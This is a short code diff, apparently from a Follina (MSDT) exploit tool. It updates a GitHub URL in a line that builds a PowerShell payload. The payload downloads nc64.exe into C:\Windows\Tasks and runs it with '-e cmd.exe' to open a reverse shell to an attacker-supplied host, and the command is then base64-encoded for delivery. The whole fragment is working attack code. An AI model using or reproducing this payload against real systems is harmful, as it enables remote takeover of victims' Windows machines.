@@ -108,7 +108,7 @@ def main(args):
 
     command = args.command
     if args.reverse:
-        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/master/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
+        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
 
     # Base64 encode our command so whitespace is respected
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
